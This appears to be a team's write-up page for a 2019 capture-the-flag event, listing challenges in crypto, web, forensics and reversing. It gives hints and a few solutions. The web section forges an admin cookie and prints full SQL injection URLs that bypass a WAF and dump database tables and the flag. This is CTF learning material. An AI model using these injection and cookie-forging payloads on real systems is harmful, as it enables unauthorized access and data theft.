# CTF-Open-2019


## Crpyto

### Simple Crypto 50 [50pt, 12/12 Solves]
> I got a message from a friend, ARKLN{EekwcxiXxgprwbwlMsariMmzorcklKaxzej} with the key of thisisasecretkey. Can you use the > table to help me to decrypt it?

### Simple Crypto 2 [100pt, 12/12 Solves]
> I got another message from a friend, wzr%uL>6DD28606?4CJAE650FD:?80C@EcfN. Can you help me to decrypt it this time?

### Protect [100pt, 7/12 Solves]
> The message is encrypted with a password with the provided script! Can you get us the password?

### Encrypted message [100pt, 7/12 Solves]
> B jif'b tewwrbo xfbz qk amcs oa kkww iywttwm tb UQMXD. Ba'a steodh ny sj G lvtnmv a afbhvik tszwivy! Zyne. Ripx'z bzm xllu: > UQMXD{lbjkbatfhvux_ggiomja_srp_hbu_oeqr_jqhpwr_ec_fuvzc}

### Login [100pt, 0/12 Solves]
> We found some important files on a linux computer. Can you use them to get the information we needed from 47.56.165.70 port > 23457?

### RSA 1 [300pt, 7/12 Solves]
> A customer suspected that his message are cracked by somebody. Can you confirm the issue by decrypting the message below?
> c: 1267512865767235284579628962679981517661651162006242932307504395229069157817213250932198187
> 
> n: 1441341319160614646189772775947458689224268167522603816085381857689639120119532883988453931
> 
> e: 65537

### Mersenne 16 [400pt, 0/12 Solves]
> Is it possible to decrypt the message using public key?
>
#### Idea
- The n is abled to facter using the FacterDB, the public key is found but we failed to decrypt the file. We don't know why.

### RSA 2 [450pt, 9/12 Solves]
> The customer fixed the previous issue. Can you decrypt the message this time?
>
> c: 52127047932811110668013864133349571790867805534855543297048613670965313472772560575182413718393507843165300390227330555558736664829280206143700900677133430280286900207970264306716622456672164011284966405111997950821662174402552515880677459669874493401227056820044471828999856535032257525489909965248714298022`
>
> n: 123011419727242929605859484379712787224119427868122185028414426038747211967728126687082223191959583800124030930442533997557997625495312608148837196827665382944411142837816321635710707548473070155845149369804586838545770200114861944189730393681376431146673015470955622822572616394605670811484761576817673309001
>
> e: 20370827750732677953101194500404700852089173301382884082478321647291201786559551992537091540692087873762090234342322985115231826746732803397154738501467143140654322623572067396058860233911575260540468106570172920030157403146163826401598627492164762337650828047117823273414399019740348998847585859920303350373

## Pwn
### Buffer Overflow [100pt, 10/12 Solves]
> Can you overflow the right buffer in this program, vuln, to get the flag? You can read the source (has the same functionality as) of the program, vuln.c, if you want to.

### Crack Me [400pt, 0/12 Solves]
> Finding the passcode that can pass the authentication of auth.bin.

## Web
### Client is not secure [50pt, 11/12 Solves]
> Can you help me to find my password? http://47.56.165.70:25241/login.php

### Admin Access [125pt, 11/12 Solves]
> I got a non-admin account (username is user, password is 1234) for this website: http://47.56.165.70:32954/login.php. But I need an admin user. How should I do?

#### Idea
- Cookie include sensitive parameters 
- Base64 encode in Token

#### Writeup
Using the crediential of non-admin account willl received a cookie auth which is base64 encoded. After base64 decode the auth cookie: 'user = "user"; password = "1234"; admin = FALSE'. We set admin=TRUE then re-encoded it, we got 'dXNlciA9ICJ1c2VyIjsgcGFzc3dvcmQgPSAiMTIzNCI7IGFkbWluID0gVFJVRQ=='. Modify the cookie. Reload it then the flag is shown.

### Only Web? No [300pt, 11/12 Solves]
>Do you want to read some Book?
>Please access it on http://13.251.58.69:8004

#### Idea

> ### Unbreakable WAF [400pt, 1/12 Solves]
> Is this really an unbreakable Cloud WAF? Please access http://47.56.124.67/.

#### Tags
**base64_encode**, **WAF**, **PHP**, **SQLi**

#### Idea 
- With thanks to [Blackbox](https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/README.md#blackbox)
- Bypass WAF by incorrect usage of BASE64 and URLENCODE
- SQL Injection with `union` select

#### Writeup
The PHP pass our parameters 'username' to the function base64_encode() before sending to the Orange WAF. The WAF is not allow us to send the symbol like ' and " or even space. After Google, we found the Blackbox writeup, so we tried with three queries which all starct with `~~~~` :
- To view current database: `http://47.56.124.67/?username=orange~~~~' or '1' = '1' union select database() union select '12' from users where '1' = '1
http://47.56.124.67/?username=orange~~~~' or '1' = '1' union select table_name from INFORMATION_SCHEMA.tables union select '12' from users where '1' = '1`
- To find the column name: `http://47.56.124.67/?username=orange~~~~' or '1' = '1' union select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS union select '12' from users where '1' = '1`
- To find the flag: `http://47.56.124.67/?username=orange~~~~' or '1' = '1' union select FLAG from flag union select '12' from users where '1' = '1`

## Forensics
### Good Image [50pt, 11/12 Solves]
> Can you help us find the flag in this image?

### Simple Forensics [50pt, 11/12 Solves]
> Can you find the flag in this file?

### Simple Forensics 2 [50pt, 11/12 Solves]
> Can you find the flag in this file?

### Broken string [125pt, 3/12 Solves]
> My secret string was broken because of fire. Can you help to decode?
>
#### Idea
- The text on image look like base64 encoded
- Try decode substring on the image and guess the flag

### Secret Image 1 [125pt, 1/12 Solves]
> Can you find the flag encoded inside the image?

#### Tag
**Stegsolve**, **LSB**
#### Idea
- No hidden file using Binwalk
- Weird horizontal line when put it in the Stegsolve (Random color map, RGB alpha plane 0)
- Try extract data using Stegsolve

#### Writeup
- Try different settings on Data Extract in Stegsolve
- A Base64 string `SEtDVEZ7TTNzc0BnM19oMWRkM25faW5fZHJAZzBuXzA4MTNkNmF9` was found with this 'Data Extract' settings: 
  - Alpha: Untick, Red: 0, Green: 0, Blue: 0
> - Extract By: Column
> - Bit Order: LSB First
> - Bit Plane Order: RBG
- Decode the base64 and get the flag


### Secret Image 2 [350pt, 0/12 Solves]
> Can you find the flag encoded inside the image?

## Reverse Engineering
### Simple APK [100pt, 10/12 Solves]
> Find the flag in the APK

### Basic Assembly [125pt, 6/12 Solves]
> My friend agreed to buy me a lunch if I know the value of EAX in the file. Can you help me?
>
> Please submit the flag as a hexadecimal value in the format of HKCTF{0x}.

### Secret in Android App 1 [125pt, 11/12 Solves]
> Something interested is stored in the Android app. But I can't find it because I don't know the PIN. Can you help me?

### Secret in Android App 2 [250pt, 0/12 Solves]
> The protection method changed. Can you find the flag this time?

## Misc
### Bit Key [50pt, 10/12 Solves]
> Can you find the password to gain access from the script?

### Spider man [125pt, 1/12 Solves]
> Where the spider can't access, where the answer is.
>
> Please access it on http://13.251.58.69:8003



